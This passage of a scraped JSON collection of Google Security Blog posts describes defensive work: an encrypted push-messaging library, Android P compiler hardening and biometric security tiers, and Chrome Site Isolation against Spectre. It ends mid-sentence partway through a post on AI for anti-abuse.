{"website": "Google-Security", "title": "\nEnd-to-end encryption for push messaging, simplified\n", "author": [], "link": "https://security.googleblog.com/2018/06/end-to-end-encryption-for-push.html", "abstract": "                            Posted by Giles Hogben, Privacy Engineer and Milinda Perera, Software Engineer       [Cross-posted from the  Android Developers Blog ]     Developers already use HTTPS to communicate with Firebase Cloud Messaging (FCM). The channel between FCM server endpoint and the device is encrypted with SSL over TCP. However, messages are not encrypted end-to-end (E2E) between the developer server and the user device unless developers take special measures.    To this end, we  advise  developers to use keys generated on the user device to encrypt push messages end-to-end. But implementing such E2E encryption has historically required significant technical knowledge and effort. That is why we are excited to announce the  Capillary open source library  which greatly simplifies the implementation of E2E-encryption for push messages between developer servers and users' Android devices.   We also added functionality for sending messages that can only be decrypted on devices that have recently been unlocked. This is designed to support for decrypting messages on devices using  File-Based Encryption  (FBE): encrypted messages are cached in Device Encrypted (DE) storage and message decryption keys are stored in  Android Keystore , requiring  user authentication . This allows developers to specify messages with sensitive content, that remain encrypted in cached form until the user has unlocked and decrypted their device.   The library handles:      Crypto functionality and key management across all versions of Android back to  KitKat  (API level 19).    Key generation and registration workflows.    Message encryption (on the server) and decryption (on the client).    Integrity protection to prevent message modification.    Caching of messages received in unauthenticated contexts to be decrypted and displayed upon device unlock.    Edge-cases, such as users adding/resetting device lock after installing the app, users resetting app storage, etc.    The library supports both RSA encryption with ECDSA authentication and  Web Push encryption , allowing developers to re-use existing server-side code developed for sending E2E-encrypted Web Push messages to browser-based clients.   Along with the library, we are also publishing a demo app (at last, the Google privacy team has its own messaging app!) that uses the library to send E2E-encrypted FCM payloads from a gRPC-based server implementation.     What it's not     The open source library and demo app are not designed to support peer-to-peer messaging and key exchange. They are designed for developers to send E2E-encrypted push messages from a server to one or more devices. You can protect messages between the developer's server and the destination device, but not directly between devices.    It is not a comprehensive server-side solution. While core crypto functionality is provided, developers will need to adapt parts of the sample server-side code that are specific to their architecture (for example, message composition, database storage for public keys, etc.)    You can find more technical details describing how we've architected and implemented the library and demo  here .                                    Posted by Giles Hogben, Privacy Engineer and Milinda Perera, Software Engineer    [Cross-posted from the Android Developers Blog]  Developers already use HTTPS to communicate with Firebase Cloud Messaging (FCM). The channel between FCM server endpoint and the device is encrypted with SSL over TCP. However, messages are not encrypted end-to-end (E2E) between the developer server and the user device unless developers take special measures.   To this end, we advise developers to use keys generated on the user device to encrypt push messages end-to-end. But implementing such E2E encryption has historically required significant technical knowledge and effort. That is why we are excited to announce the Capillary open source library which greatly simplifies the implementation of E2E-encryption for push messages between developer servers and users' Android devices.  We also added functionality for sending messages that can only be decrypted on devices that have recently been unlocked. This is designed to support for decrypting messages on devices using File-Based Encryption (FBE): encrypted messages are cached in Device Encrypted (DE) storage and message decryption keys are stored in Android Keystore, requiring user authentication. This allows developers to specify messages with sensitive content, that remain encrypted in cached form until the user has unlocked and decrypted their device.  The library handles:   Crypto functionality and key management across all versions of Android back to KitKat (API level 19).  Key generation and registration workflows.  Message encryption (on the server) and decryption (on the client).  Integrity protection to prevent message modification.  Caching of messages received in unauthenticated contexts to be decrypted and displayed upon device unlock.  Edge-cases, such as users adding/resetting device lock after installing the app, users resetting app storage, etc.  The library supports both RSA encryption with ECDSA authentication and Web Push encryption, allowing developers to re-use existing server-side code developed for sending E2E-encrypted Web Push messages to browser-based clients.  Along with the library, we are also publishing a demo app (at last, the Google privacy team has its own messaging app!) that uses the library to send E2E-encrypted FCM payloads from a gRPC-based server implementation.   What it's not  The open source library and demo app are not designed to support peer-to-peer messaging and key exchange. They are designed for developers to send E2E-encrypted push messages from a server to one or more devices. You can protect messages between the developer's server and the destination device, but not directly between devices.  It is not a comprehensive server-side solution. While core crypto functionality is provided, developers will need to adapt parts of the sample server-side code that are specific to their architecture (for example, message composition, database storage for public keys, etc.)  You can find more technical details describing how we've architected and implemented the library and demo here.     ", "date": "June 5, 2018"},
{"website": "Google-Security", "title": "\nCompiler-based security mitigations in Android P\n", "author": ["Posted by Ivan Lozano, Information Security Engineer"], "link": "https://security.googleblog.com/2018/06/compiler-based-security-mitigations-in.html", "abstract": "                             Posted by Ivan Lozano, Information Security Engineer        [Cross-posted from the  Android Developers Blog ]     Android's switch to LLVM/Clang as the default platform compiler in Android 7.0 opened up more possibilities for improving our defense-in-depth security posture. In the past couple of releases, we've rolled out additional compiler-based mitigations to make bugs harder to exploit and prevent certain types of bugs from becoming vulnerabilities. In Android P, we're expanding our existing compiler mitigations, which instrument runtime operations to fail safely when undefined behavior occurs. This post describes the new build system support for Control Flow Integrity and Integer Overflow Sanitization.     Control Flow Integrity  A key step in modern exploit chains is for an attacker to gain control of a program's control flow by corrupting function pointers or return addresses. This opens the door to code-reuse attacks where an attacker executes arbitrary portions of existing program code to achieve their goals, such as  counterfeit-object-oriented  and  return-oriented  programming. Control Flow Integrity (CFI) describes a set of mitigation technologies that confine a program's control flow to a call graph of valid targets determined at compile-time.   While we first supported LLVM's CFI implementation in select components in Android O, we're greatly expanding that support in P. This implementation focuses on preventing control flow manipulation via indirect branches, such as function pointers and virtual functions&#8212;the 'forward-edges' of a call graph. Valid branch targets are defined as function entry points for functions with the expected function signature, which drastically reduces the set of allowable destinations an attacker can call. Indirect branches are instrumented to detect runtime violations of the statically determined set of allowable targets. If a violation is detected because a branch points to an unexpected target, then the process safely aborts.             Figure 1 . Assembly-level comparison of a virtual function call with and without CFI enabled.   For example,  Figure 1  illustrates how a function that takes an object and calls a virtual function gets translated into assembly with and without CFI. For simplicity, this was compiled with -O0 to prevent compiler optimization. Without CFI enabled, it loads the object's vtable pointer and calls the function at the expected offset. With CFI enabled, it performs a fast-path first check to determine if the pointer falls within an expected range of addresses of compatible vtables. Failing that, execution falls through to a slow path that does a more extensive check for valid classes that are defined in other shared libraries. The slow path will abort execution if the vtable pointer points to an invalid target.    With control flow tightly restricted to a small set of legitimate targets, code-reuse attacks become harder to utilize and some memory corruption vulnerabilities become more difficult or even impossible to exploit.   In terms of performance impact, LLVM's CFI requires compiling with  Link-Time Optimization (LTO) . LTO preserves the LLVM bitcode representation of object files until link-time, which allows the compiler to better reason about what optimizations can be performed. Enabling LTO reduces the size of the final binary and improves performance, but increases compile time. In testing on Android, the combination of LTO and CFI results in negligible overhead to code size and performance; in a few cases both improved.   For more technical details about CFI and how other forward-control checks are handled, see the  LLVM design documentation .   For Android P, CFI is  enabled by default  widely within the media frameworks and other security-critical components, such as NFC and Bluetooth.  CFI kernel support  has also been introduced into the Android common kernel when building with LLVM, providing the option to further harden the trusted computing base. This can be tested today on the HiKey reference boards.     Integer Overflow Sanitization  The UndefinedBehaviorSanitizer's (UBSan) signed and unsigned integer overflow sanitization was first utilized when  hardening the media stack  in Android Nougat. This sanitization is designed to safely abort process execution if a signed or unsigned integer overflows by instrumenting arithmetic instructions which may overflow. The end result is the mitigation of an entire class of memory corruption and information disclosure vulnerabilities where the root cause is an integer overflow, such as the original Stagefright vulnerability.    Because of their success, we've expanded usage of these sanitizers in the media framework with each release. Improvements have been made to LLVM's integer overflow sanitizers to reduce the performance impact by using  fewer   instructions  in ARM 32-bit and removing  unnecessary   checks . In testing, these improvements reduced the sanitizers' performance overhead by over 75% in Android's 32-bit libstagefright library for some codecs. Improved Android build system support, such as better diagnostics support, more sensible crashes, and globally sanitized integer overflow targets for testing have also expedited the rollout of these sanitizers.   We've prioritized enabling integer overflow sanitization in libraries where complex untrusted input is processed or where there have been security bulletin-level integer overflow vulnerabilities reported. As a result, in Android P the following libraries now benefit from this mitigation:      libui     libnl     libmediaplayerservice     libexif    libdrmclearkeyplugin     libreverbwrapper       Future Plans  Moving forward, we're expanding our use of these mitigation technologies and we strongly encourage vendors to do the same with their customizations. More information about how to enable and test these options will be available soon on the  Android Open Source Project .    Acknowledgements: This post was developed in joint collaboration with Vishwath Mohan, Jeffrey Vander Stoep, Joel Galenson, and Sami Tolvanen                                     Posted by Ivan Lozano, Information Security Engineer    [Cross-posted from the Android Developers Blog]  Android's switch to LLVM/Clang as the default platform compiler in Android 7.0 opened up more possibilities for improving our defense-in-depth security posture. In the past couple of releases, we've rolled out additional compiler-based mitigations to make bugs harder to exploit and prevent certain types of bugs from becoming vulnerabilities. In Android P, we're expanding our existing compiler mitigations, which instrument runtime operations to fail safely when undefined behavior occurs. This post describes the new build system support for Control Flow Integrity and Integer Overflow Sanitization.   Control Flow Integrity A key step in modern exploit chains is for an attacker to gain control of a program's control flow by corrupting function pointers or return addresses. This opens the door to code-reuse attacks where an attacker executes arbitrary portions of existing program code to achieve their goals, such as counterfeit-object-oriented and return-oriented programming. Control Flow Integrity (CFI) describes a set of mitigation technologies that confine a program's control flow to a call graph of valid targets determined at compile-time.  While we first supported LLVM's CFI implementation in select components in Android O, we're greatly expanding that support in P. This implementation focuses on preventing control flow manipulation via indirect branches, such as function pointers and virtual functions—the 'forward-edges' of a call graph. Valid branch targets are defined as function entry points for functions with the expected function signature, which drastically reduces the set of allowable destinations an attacker can call. Indirect branches are instrumented to detect runtime violations of the statically determined set of allowable targets. If a violation is detected because a branch points to an unexpected target, then the process safely aborts.      Figure 1. Assembly-level comparison of a virtual function call with and without CFI enabled.  For example, Figure 1 illustrates how a function that takes an object and calls a virtual function gets translated into assembly with and without CFI. For simplicity, this was compiled with -O0 to prevent compiler optimization. Without CFI enabled, it loads the object's vtable pointer and calls the function at the expected offset. With CFI enabled, it performs a fast-path first check to determine if the pointer falls within an expected range of addresses of compatible vtables. Failing that, execution falls through to a slow path that does a more extensive check for valid classes that are defined in other shared libraries. The slow path will abort execution if the vtable pointer points to an invalid target.   With control flow tightly restricted to a small set of legitimate targets, code-reuse attacks become harder to utilize and some memory corruption vulnerabilities become more difficult or even impossible to exploit.  In terms of performance impact, LLVM's CFI requires compiling with Link-Time Optimization (LTO). LTO preserves the LLVM bitcode representation of object files until link-time, which allows the compiler to better reason about what optimizations can be performed. Enabling LTO reduces the size of the final binary and improves performance, but increases compile time. In testing on Android, the combination of LTO and CFI results in negligible overhead to code size and performance; in a few cases both improved.  For more technical details about CFI and how other forward-control checks are handled, see the LLVM design documentation.  For Android P, CFI is enabled by default widely within the media frameworks and other security-critical components, such as NFC and Bluetooth. CFI kernel support has also been introduced into the Android common kernel when building with LLVM, providing the option to further harden the trusted computing base. This can be tested today on the HiKey reference boards.   Integer Overflow Sanitization The UndefinedBehaviorSanitizer's (UBSan) signed and unsigned integer overflow sanitization was first utilized when hardening the media stack in Android Nougat. This sanitization is designed to safely abort process execution if a signed or unsigned integer overflows by instrumenting arithmetic instructions which may overflow. The end result is the mitigation of an entire class of memory corruption and information disclosure vulnerabilities where the root cause is an integer overflow, such as the original Stagefright vulnerability.   Because of their success, we've expanded usage of these sanitizers in the media framework with each release. Improvements have been made to LLVM's integer overflow sanitizers to reduce the performance impact by using fewer instructions in ARM 32-bit and removing unnecessary checks. In testing, these improvements reduced the sanitizers' performance overhead by over 75% in Android's 32-bit libstagefright library for some codecs. Improved Android build system support, such as better diagnostics support, more sensible crashes, and globally sanitized integer overflow targets for testing have also expedited the rollout of these sanitizers.  We've prioritized enabling integer overflow sanitization in libraries where complex untrusted input is processed or where there have been security bulletin-level integer overflow vulnerabilities reported. As a result, in Android P the following libraries now benefit from this mitigation:   libui   libnl   libmediaplayerservice   libexif  libdrmclearkeyplugin   libreverbwrapper    Future Plans Moving forward, we're expanding our use of these mitigation technologies and we strongly encourage vendors to do the same with their customizations. More information about how to enable and test these options will be available soon on the Android Open Source Project.  Acknowledgements: This post was developed in joint collaboration with Vishwath Mohan, Jeffrey Vander Stoep, Joel Galenson, and Sami Tolvanen     ", "date": "June 27, 2018"},
{"website": "Google-Security", "title": "\nBetter Biometrics in Android P\n", "author": ["Posted by Vishwath Mohan, Security Engineer"], "link": "https://security.googleblog.com/2018/06/better-biometrics-in-android-p.html", "abstract": "                             Posted by Vishwath Mohan, Security Engineer      [Cross-posted from the  Android Developers Blog ]     To keep users safe, most apps and devices have an authentication mechanism, or a way to prove that you're you. These mechanisms fall into three categories: knowledge factors, possession factors, and biometric factors.  Knowledge  factors ask for something you know (like a PIN or a password),  possession  factors ask for something you have (like a token generator or security key), and  biometric  factors ask for something you are (like your fingerprint, iris, or face).         Biometric authentication mechanisms are becoming increasingly popular, and it's easy to see why. They're faster than typing a password, easier than carrying around a separate security key, and they prevent one of the most common pitfalls of knowledge-factor based authentication&#8212;the risk of  shoulder surfing .   As more devices incorporate biometric authentication to safeguard people's private information, we're improving biometrics-based authentication in Android P by:      Defining a better model to measure biometric security, and using that to functionally constrain weaker authentication methods.    Providing a common platform-provided entry point for developers to integrate biometric authentication into their apps.      A better security model for biometrics  Currently, biometric unlocks quantify their performance today with two metrics borrowed from  machine learning (ML): False Accept Rate (FAR), and False Reject Rate (FRR).   In the case of biometrics, FAR measures how often a biometric model accidentally classifies an incorrect input as belonging to the target user&#8212;that is, how often another user is falsely recognized as the legitimate device owner. Similarly, FRR measures how often a biometric model accidentally classifies the user's biometric as incorrect&#8212;that is, how often a legitimate device owner has to retry their authentication. The first is a security concern, while the second is problematic for usability.   Both metrics do a great job of measuring the accuracy and precision of a given ML (or biometric) model when applied to random input samples. However, because neither metric accounts for an active attacker as part of the threat model, they do not provide very useful information about its resilience against attacks.   In Android 8.1, we  introduced two new metrics  that more explicitly account for an attacker in the threat model: Spoof Accept Rate (SAR) and Imposter Accept Rate (IAR). As their names suggest, these metrics measure how easily an attacker can bypass a biometric authentication scheme. Spoofing refers to the use of a known-good recording (e.g. replaying a voice recording or using a face or fingerprint picture), while impostor acceptance means a successful mimicking of another user's biometric (e.g. trying to sound or look like a target user).     Strong vs. Weak Biometrics  We use the  SAR/IAR metrics  to categorize biometric authentication mechanisms as either strong or weak. Biometric authentication mechanisms with an SAR/IAR of 7% or lower are strong, and anything above 7% is weak. Why 7% specifically? Most fingerprint implementations have a SAR/IAR metric of about 7%, making this an appropriate standard to start with for other modalities as well. As biometric sensors and classification methods improve, this threshold can potentially be decreased in the future.   This binary classification is a slight oversimplification of the range of security that different implementations provide. However, it gives us a scalable mechanism (via the tiered authentication model) to appropriately scope the capabilities and the constraints of different biometric implementations across the ecosystem, based on the overall risk they pose.   While both strong and weak biometrics will be allowed to unlock a device, weak biometrics:      require the user to re-enter their primary PIN, pattern, password or a strong biometric to unlock a device after a 4-hour window of inactivity, such as when left at a desk or charger. This is in addition to the 72-hour timeout that is enforced for both strong and weak biometrics.    are not supported by the forthcoming  BiometricPrompt API , a common API for app developers to securely authenticate users on a device in a modality-agnostic way.    can't authenticate payments or participate in other transactions that involve a KeyStore auth-bound key.    must show users a warning that articulates the risks of using the biometric before it can be enabled.    These measures are intended to allow weaker biometrics, while reducing the risk of unauthorized access.     BiometricPrompt API  Starting in Android P, developers can use the  BiometricPrompt API  to integrate biometric authentication into their apps in a device and biometric agnostic way. BiometricPrompt only exposes strong modalities, so developers can be assured of a consistent level of security across all devices their application runs on. A support library is also provided for devices running Android O and earlier,  allowing applications to utilize the advantages of this API across more devices .   Here's a high-level architecture of BiometricPrompt.         The API is intended to be easy to use, allowing the platform to select an appropriate biometric to authenticate with instead of forcing app developers to implement this logic themselves. Here's an example of how a developer might use it in their app:           Conclusion  Biometrics have the potential to both simplify and strengthen how we authenticate our digital identity, but only if they are designed securely, measured accurately, and implemented in a privacy-preserving manner.   We want Android to get it right across all three. So we're combining secure design principles, a more attacker-aware measurement methodology, and a common, easy to use biometrics API that allows developers to integrate authentication in a simple, consistent, and safe manner.     Acknowledgements: This post was developed in joint collaboration with Jim Miller                                     Posted by Vishwath Mohan, Security Engineer  [Cross-posted from the Android Developers Blog]  To keep users safe, most apps and devices have an authentication mechanism, or a way to prove that you're you. These mechanisms fall into three categories: knowledge factors, possession factors, and biometric factors. Knowledge factors ask for something you know (like a PIN or a password), possession factors ask for something you have (like a token generator or security key), and biometric factors ask for something you are (like your fingerprint, iris, or face).    Biometric authentication mechanisms are becoming increasingly popular, and it's easy to see why. They're faster than typing a password, easier than carrying around a separate security key, and they prevent one of the most common pitfalls of knowledge-factor based authentication—the risk of shoulder surfing.  As more devices incorporate biometric authentication to safeguard people's private information, we're improving biometrics-based authentication in Android P by:   Defining a better model to measure biometric security, and using that to functionally constrain weaker authentication methods.  Providing a common platform-provided entry point for developers to integrate biometric authentication into their apps.   A better security model for biometrics Currently, biometric unlocks quantify their performance today with two metrics borrowed from  machine learning (ML): False Accept Rate (FAR), and False Reject Rate (FRR).  In the case of biometrics, FAR measures how often a biometric model accidentally classifies an incorrect input as belonging to the target user—that is, how often another user is falsely recognized as the legitimate device owner. Similarly, FRR measures how often a biometric model accidentally classifies the user's biometric as incorrect—that is, how often a legitimate device owner has to retry their authentication. The first is a security concern, while the second is problematic for usability.  Both metrics do a great job of measuring the accuracy and precision of a given ML (or biometric) model when applied to random input samples. However, because neither metric accounts for an active attacker as part of the threat model, they do not provide very useful information about its resilience against attacks.  In Android 8.1, we introduced two new metrics that more explicitly account for an attacker in the threat model: Spoof Accept Rate (SAR) and Imposter Accept Rate (IAR). As their names suggest, these metrics measure how easily an attacker can bypass a biometric authentication scheme. Spoofing refers to the use of a known-good recording (e.g. replaying a voice recording or using a face or fingerprint picture), while impostor acceptance means a successful mimicking of another user's biometric (e.g. trying to sound or look like a target user).   Strong vs. Weak Biometrics We use the SAR/IAR metrics to categorize biometric authentication mechanisms as either strong or weak. Biometric authentication mechanisms with an SAR/IAR of 7% or lower are strong, and anything above 7% is weak. Why 7% specifically? Most fingerprint implementations have a SAR/IAR metric of about 7%, making this an appropriate standard to start with for other modalities as well. As biometric sensors and classification methods improve, this threshold can potentially be decreased in the future.  This binary classification is a slight oversimplification of the range of security that different implementations provide. However, it gives us a scalable mechanism (via the tiered authentication model) to appropriately scope the capabilities and the constraints of different biometric implementations across the ecosystem, based on the overall risk they pose.  While both strong and weak biometrics will be allowed to unlock a device, weak biometrics:   require the user to re-enter their primary PIN, pattern, password or a strong biometric to unlock a device after a 4-hour window of inactivity, such as when left at a desk or charger. This is in addition to the 72-hour timeout that is enforced for both strong and weak biometrics.  are not supported by the forthcoming BiometricPrompt API, a common API for app developers to securely authenticate users on a device in a modality-agnostic way.  can't authenticate payments or participate in other transactions that involve a KeyStore auth-bound key.  must show users a warning that articulates the risks of using the biometric before it can be enabled.  These measures are intended to allow weaker biometrics, while reducing the risk of unauthorized access.   BiometricPrompt API Starting in Android P, developers can use the BiometricPrompt API to integrate biometric authentication into their apps in a device and biometric agnostic way. BiometricPrompt only exposes strong modalities, so developers can be assured of a consistent level of security across all devices their application runs on. A support library is also provided for devices running Android O and earlier,  allowing applications to utilize the advantages of this API across more devices .  Here's a high-level architecture of BiometricPrompt.    The API is intended to be easy to use, allowing the platform to select an appropriate biometric to authenticate with instead of forcing app developers to implement this logic themselves. Here's an example of how a developer might use it in their app:     Conclusion Biometrics have the potential to both simplify and strengthen how we authenticate our digital identity, but only if they are designed securely, measured accurately, and implemented in a privacy-preserving manner.  We want Android to get it right across all three. So we're combining secure design principles, a more attacker-aware measurement methodology, and a common, easy to use biometrics API that allows developers to integrate authentication in a simple, consistent, and safe manner.   Acknowledgements: This post was developed in joint collaboration with Jim Miller     ", "date": "June 21, 2018"},
{"website": "Google-Security", "title": "\nMitigating Spectre with Site Isolation in Chrome\n", "author": ["Posted by Charlie Reis, Site Isolator"], "link": "https://security.googleblog.com/2018/07/mitigating-spectre-with-site-isolation.html", "abstract": "                             Posted by Charlie Reis, Site Isolator     Speculative execution side-channel attacks like Spectre are a newly discovered security risk for web browsers. A website could use such attacks to steal data or login information from other websites that are open in the browser. To better mitigate these attacks, we're excited to announce that Chrome 67 has enabled a security feature called  Site Isolation  on Windows, Mac, Linux, and Chrome OS. Site Isolation has been optionally available as an experimental enterprise policy since Chrome 63, but many known issues have been resolved since then, making it practical to enable by default for all desktop Chrome users.    This launch is one phase of our overall Site Isolation project. Stay tuned for additional security updates that will mitigate attacks beyond Spectre (e.g., attacks from fully compromised renderer processes).     What is Spectre?       In January, Google Project Zero disclosed a set of  speculative execution side-channel attacks  that became publicly known as Spectre and Meltdown. An  additional variant of Spectre  was disclosed in May. These attacks use the speculative execution features of most CPUs to access parts of memory that should be off-limits to a piece of code, and then use timing attacks to discover the values stored in that memory. Effectively, this means that untrustworthy code may be able to read any memory in its process's address space.    This is particularly relevant for web browsers, since browsers run potentially malicious JavaScript code from multiple websites, often in the same process. In theory, a website could use such an attack to steal information from other websites, violating the Same Origin Policy. All major browsers have already  deployed some mitigations  for Spectre, including reducing timer granularity and changing their JavaScript compilers to make the attacks less likely to succeed. However, we believe the  most effective mitigation  is offered by approaches like Site Isolation, which try to avoid having data worth stealing in the same process, even if a Spectre attack occurs.     What is Site Isolation?        Site Isolation  is a large change to Chrome's architecture that limits each renderer process to documents from a single site. As a result, Chrome can rely on the operating system to prevent attacks between processes, and thus, between sites. Note that Chrome uses a specific definition of \"site\" that includes just the scheme and registered domain. Thus, https://google.co.uk would be a site, and subdomains like https://maps.google.co.uk would stay in the same process.    Chrome has always had a  multi-process architecture  where different tabs could use different renderer processes. A given tab could even switch processes when navigating to a new site in some cases. However, it was still possible for an attacker's page to share a process with a victim's page. For example, cross-site iframes and cross-site pop-ups typically stayed in the same process as the page that created them. This would allow a successful Spectre attack to read data (e.g., cookies, passwords, etc.) belonging to other frames or pop-ups in its process.    When Site Isolation is enabled, each renderer process contains documents from at most one site. This means all navigations to cross-site documents cause a tab to switch processes. It also means all cross-site iframes are put into a different process than their parent frame, using \" out-of-process iframes .\" Splitting a single page across multiple processes is a major change to how Chrome works, and the Chrome Security team has been  pursuing this for several years , independently of Spectre. The first uses of out-of-process iframes shipped last year to  improve the Chrome extension security model .                       A single page may now be split across multiple renderer processes using out-of-process iframes.        Even when each renderer process is limited to documents from a single site, there is still a risk that an attacker's page could access and leak information from cross-site URLs by requesting them as subresources, such as images or scripts. Web browsers generally allow pages to embed images and scripts from any site. However, a page could try to request an HTML or JSON URL with sensitive data as if it were an image or script. This would normally fail to render and not expose the data to the page, but that data would still end up inside the renderer process where a Spectre attack might access it. To mitigate this, Site Isolation includes a feature called  Cross-Origin Read Blocking  (CORB), which is now part of the  Fetch spec . CORB tries to transparently block cross-site HTML, XML, and JSON responses from the renderer process, with almost no impact to compatibility. To get the most protection from Site Isolation and CORB,  web developers should check that their resources are served with the right MIME type and with the nosniff response header .    Site Isolation is a significant change to Chrome's behavior under the hood, but it generally shouldn't cause visible changes for most users or web developers (beyond a few  known issues ). It simply offers more protection between websites behind the scenes. Site Isolation does cause Chrome to create more renderer processes, which comes with performance tradeoffs: on the plus side, each renderer process is smaller, shorter-lived, and has less contention internally, but there is about a 10-13% total memory overhead in real workloads due to the larger number of processes. Our team continues to work hard to optimize this behavior to keep Chrome both fast and secure.     How does Site Isolation help?       In Chrome 67, Site Isolation has been enabled for 99% of users on Windows, Mac, Linux, and Chrome OS. (Given the large scope of this change, we are keeping a 1% holdback for now to monitor and improve performance.) This means that even if a Spectre attack were to occur in a malicious web page, data from other websites would generally not be loaded into the same process, and so there would be much less data available to the attacker. This significantly reduces the threat posed by Spectre.    Because of this, we are planning to re-enable precise timers and features like SharedArrayBuffer (which can be used as a precise timer) for desktop.     What additional work is in progress?       We're now investigating how to extend Site Isolation coverage to Chrome for Android, where there are additional known issues. Experimental enterprise policies for enabling Site Isolation will be available in Chrome 68 for Android, and it can be enabled manually on Android using chrome://flags/#enable-site-per-process.    We're also working on additional security checks in the browser process, which will let Site Isolation mitigate not just Spectre attacks but also attacks from fully compromised renderer processes. These additional enforcements will let us reach the  original motivating goals  for Site Isolation, where Chrome can effectively treat the entire renderer process as untrusted. Stay tuned for an update about these enforcements! Finally, other major browser vendors are finding related ways to defend against Spectre by better isolating sites. We are collaborating with them and are happy to see the progress across the web ecosystem.     Help improve Site Isolation!       We offer cash rewards to researchers who submit security bugs through the  Chrome Vulnerability Reward Program . For a limited time, security bugs affecting Site Isolation may be eligible for higher rewards levels, up to twice the usual amount for information disclosure bugs. Find out more about  Chrome New Feature Special Rewards .                                   Posted by Charlie Reis, Site Isolator  Speculative execution side-channel attacks like Spectre are a newly discovered security risk for web browsers. A website could use such attacks to steal data or login information from other websites that are open in the browser. To better mitigate these attacks, we're excited to announce that Chrome 67 has enabled a security feature called Site Isolation on Windows, Mac, Linux, and Chrome OS. Site Isolation has been optionally available as an experimental enterprise policy since Chrome 63, but many known issues have been resolved since then, making it practical to enable by default for all desktop Chrome users.  This launch is one phase of our overall Site Isolation project. Stay tuned for additional security updates that will mitigate attacks beyond Spectre (e.g., attacks from fully compromised renderer processes).  What is Spectre?  In January, Google Project Zero disclosed a set of speculative execution side-channel attacks that became publicly known as Spectre and Meltdown. An additional variant of Spectre was disclosed in May. These attacks use the speculative execution features of most CPUs to access parts of memory that should be off-limits to a piece of code, and then use timing attacks to discover the values stored in that memory. Effectively, this means that untrustworthy code may be able to read any memory in its process's address space.  This is particularly relevant for web browsers, since browsers run potentially malicious JavaScript code from multiple websites, often in the same process. In theory, a website could use such an attack to steal information from other websites, violating the Same Origin Policy. All major browsers have already deployed some mitigations for Spectre, including reducing timer granularity and changing their JavaScript compilers to make the attacks less likely to succeed. However, we believe the most effective mitigation is offered by approaches like Site Isolation, which try to avoid having data worth stealing in the same process, even if a Spectre attack occurs.  What is Site Isolation?  Site Isolation is a large change to Chrome's architecture that limits each renderer process to documents from a single site. As a result, Chrome can rely on the operating system to prevent attacks between processes, and thus, between sites. Note that Chrome uses a specific definition of \"site\" that includes just the scheme and registered domain. Thus, https://google.co.uk would be a site, and subdomains like https://maps.google.co.uk would stay in the same process.  Chrome has always had a multi-process architecture where different tabs could use different renderer processes. A given tab could even switch processes when navigating to a new site in some cases. However, it was still possible for an attacker's page to share a process with a victim's page. For example, cross-site iframes and cross-site pop-ups typically stayed in the same process as the page that created them. This would allow a successful Spectre attack to read data (e.g., cookies, passwords, etc.) belonging to other frames or pop-ups in its process.  When Site Isolation is enabled, each renderer process contains documents from at most one site. This means all navigations to cross-site documents cause a tab to switch processes. It also means all cross-site iframes are put into a different process than their parent frame, using \"out-of-process iframes.\" Splitting a single page across multiple processes is a major change to how Chrome works, and the Chrome Security team has been pursuing this for several years, independently of Spectre. The first uses of out-of-process iframes shipped last year to improve the Chrome extension security model.       A single page may now be split across multiple renderer processes using out-of-process iframes.   Even when each renderer process is limited to documents from a single site, there is still a risk that an attacker's page could access and leak information from cross-site URLs by requesting them as subresources, such as images or scripts. Web browsers generally allow pages to embed images and scripts from any site. However, a page could try to request an HTML or JSON URL with sensitive data as if it were an image or script. This would normally fail to render and not expose the data to the page, but that data would still end up inside the renderer process where a Spectre attack might access it. To mitigate this, Site Isolation includes a feature called Cross-Origin Read Blocking (CORB), which is now part of the Fetch spec. CORB tries to transparently block cross-site HTML, XML, and JSON responses from the renderer process, with almost no impact to compatibility. To get the most protection from Site Isolation and CORB, web developers should check that their resources are served with the right MIME type and with the nosniff response header.  Site Isolation is a significant change to Chrome's behavior under the hood, but it generally shouldn't cause visible changes for most users or web developers (beyond a few known issues). It simply offers more protection between websites behind the scenes. Site Isolation does cause Chrome to create more renderer processes, which comes with performance tradeoffs: on the plus side, each renderer process is smaller, shorter-lived, and has less contention internally, but there is about a 10-13% total memory overhead in real workloads due to the larger number of processes. Our team continues to work hard to optimize this behavior to keep Chrome both fast and secure.  How does Site Isolation help?  In Chrome 67, Site Isolation has been enabled for 99% of users on Windows, Mac, Linux, and Chrome OS. (Given the large scope of this change, we are keeping a 1% holdback for now to monitor and improve performance.) This means that even if a Spectre attack were to occur in a malicious web page, data from other websites would generally not be loaded into the same process, and so there would be much less data available to the attacker. This significantly reduces the threat posed by Spectre.  Because of this, we are planning to re-enable precise timers and features like SharedArrayBuffer (which can be used as a precise timer) for desktop.  What additional work is in progress?  We're now investigating how to extend Site Isolation coverage to Chrome for Android, where there are additional known issues. Experimental enterprise policies for enabling Site Isolation will be available in Chrome 68 for Android, and it can be enabled manually on Android using chrome://flags/#enable-site-per-process.  We're also working on additional security checks in the browser process, which will let Site Isolation mitigate not just Spectre attacks but also attacks from fully compromised renderer processes. These additional enforcements will let us reach the original motivating goals for Site Isolation, where Chrome can effectively treat the entire renderer process as untrusted. Stay tuned for an update about these enforcements! Finally, other major browser vendors are finding related ways to defend against Spectre by better isolating sites. We are collaborating with them and are happy to see the progress across the web ecosystem.  Help improve Site Isolation!  We offer cash rewards to researchers who submit security bugs through the Chrome Vulnerability Reward Program. For a limited time, security bugs affecting Site Isolation may be eligible for higher rewards levels, up to twice the usual amount for information disclosure bugs. Find out more about Chrome New Feature Special Rewards.     ", "date": "July 11, 2018"},
{"website": "Google-Security", "title": "\nLeveraging AI to protect our users and the web\n", "author": ["Posted by Elie Bursztein, Anti-Abuse Research Lead - Ian Goodfellow, Adversarial Machine Learning Research Lead"], "link": "https://security.googleblog.com/2018/04/leveraging-ai-to-protect-our-users-and.html", "abstract": "                             Posted by Elie Bursztein, Anti-Abuse Research Lead - Ian Goodfellow, Adversarial Machine Learning Research Lead     Recent advances in AI are transforming how we combat fraud and abuse and implement new security protections. These advances are critical to meeting our users&#8217; expectations and keeping increasingly sophisticated attackers at bay, but they come with brand new challenges as well.    This week at RSA, we explored the intersection between AI, anti-abuse, and security in two talks.    Our  first talk  provided a concise overview of how we apply AI to fraud and abuse problems. The talk started by detailing the fundamental reasons why AI is key to building defenses that keep up with user expectations and combat increasingly sophisticated attacks. It then delved into the top 10 anti-abuse specific challenges encountered while applying AI to abuse fighting and how to overcome them. Check out the infographic at the end of the post for a quick overview of the challenges we covered during the talk.    Our  second talk  looked at attacks on ML models themselves and the ongoing effort to develop new defenses.    It covered attackers&#8217; attempts to recover private training data, to introduce examples into the training set of a machine learning model to cause it to learn incorrect behaviors, to modify the input that a machine learning model receives at classification time 